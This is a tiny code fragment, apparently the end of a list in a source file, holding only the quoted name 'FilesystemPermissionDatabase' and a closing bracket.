    'FilesystemPermissionDatabase'
]